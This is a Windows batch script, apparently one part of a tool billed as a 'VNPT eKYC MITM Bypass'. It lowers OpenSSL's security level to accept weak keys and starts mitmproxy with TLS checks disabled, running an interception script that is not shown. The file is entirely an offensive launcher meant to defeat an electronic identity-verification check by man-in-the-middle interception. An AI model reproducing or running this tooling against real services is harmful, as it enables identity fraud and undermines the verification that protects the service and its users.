@echo off
echo ============================================
echo   VNPT eKYC MITM Bypass - by Congn
echo ============================================
echo.
echo [*] Setting OpenSSL SECLEVEL=0 (allow weak DH keys)...
set OPENSSL_CONF=%~dp0openssl_lowsec.cnf

echo [*] Starting mitmproxy on port 8080...
echo [*] Press Ctrl+C to stop
echo.
mitmdump -s "%~dp0mitm_ekyc.py" -p 8080 --ssl-insecure --set connection_strategy=lazy
